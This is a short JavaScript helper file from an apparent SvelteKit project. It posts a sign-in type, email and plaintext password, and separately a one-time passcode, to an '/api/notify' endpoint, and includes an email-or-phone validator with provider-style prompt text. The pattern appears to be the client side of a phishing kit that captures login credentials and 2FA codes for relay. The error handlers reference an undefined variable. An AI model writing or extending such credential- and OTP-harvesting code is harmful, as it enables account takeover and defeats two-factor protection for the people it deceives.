// place files you want to import through the `$lib` alias in this folder.
export async function sendFrmData({ signinType, email, password }) {
  try {
    const res = await fetch('/api/notify', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({ signinType, email, password })
    })
  
    const result = await res.json()
    
    return result
  } catch (error) {
    console.error('Error: \n', error)
    return { error: true, message: data.message }
  }
}

export async function sendOTP({ otp, email }) {
  try {
    const res = await fetch('/api/notify', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({ otp, email })
    })
  
    const result = await res.json()
    
    return result
  } catch (error) {
    console.error('Error: \n', error)
    return { error: true, message: data.message }
  }
}

export function validateEmailFormat(input) {
  if (!input) return "Enter an email or phone number";
  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  if (input.includes('@') && !emailRegex.test(input)) {
    return "Enter a valid email address";
  }
  if (input.length < 3) return "Enter a valid email or phone number";
  return "";
}